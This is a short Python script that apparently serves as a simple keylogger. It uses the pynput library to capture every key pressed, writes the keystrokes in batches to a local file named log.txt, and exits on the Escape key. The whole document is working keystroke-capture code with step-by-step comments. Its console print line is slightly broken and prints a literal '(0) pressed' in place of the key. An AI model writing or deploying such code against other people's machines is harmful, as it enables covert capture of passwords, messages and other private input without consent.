# run cmd -m pip install pynput
import pynput

from pynput.keyboard import Key, Listener
#creating a count to track when to save the keystrokes into log
count = 0
#list to store the keys
keys = []
#function to record when a key is pressed
def on_press(key):
    global keys, count
    # appending the keystrokes to the key list
    keys.append(key)
    count += 1
    #log into console what keys are pressed
    print("(0) pressed".format(key))
#setting a "timer" so that when more than 10 keys are pressed it will write
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
#function to write append to a log file the keystrokes
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

#function to record when a key is released
def on_release(key):
    #break out fo the program when the Escape key is pressed
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
